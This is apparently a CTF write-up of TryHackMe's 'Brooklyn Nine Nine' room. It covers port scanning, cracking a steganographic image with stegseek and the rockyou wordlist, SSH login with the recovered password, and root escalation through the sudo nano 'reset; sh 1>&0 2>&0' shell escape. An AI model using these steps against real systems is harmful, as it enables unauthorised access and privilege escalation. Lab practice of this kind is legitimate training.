---
title: Walkthrough - Brooklyn Nine Nine
published: true
---

[https://tryhackme.com/room/brooklynninenine](https://tryhackme.com/room/brooklynninenine)

* * *

## Hacking

```shell
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Visiting the website and viewing source get a nice comment ``<!-- Have you ever heard of steganography? -->`` lets check out the image

- ``wget http://10.10.30.68/brooklyn99.jpg``
- ``stegseek brooklyn99.jpg /usr/share/seclists/Passwords/rockyou.txt``

```shell
cat brooklyn99.jpg.out 
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

Don't get much else of the webserver. In the ftp logged in as anon we get another note.

```shell
cat note_to_jake.txt  
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

Now we can login to ssh with holt's creds, and get the user flag

* * * 

## User Flag

- ``cat user.txt`` in holts home dir

* * * 

## Root Flag

```shell
User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

- ``sudo nano``
- Ctrl+R Ctrl+X
- ``reset; sh 1>&0 2>&0``
- ``cat /root/root.txt``

* * * 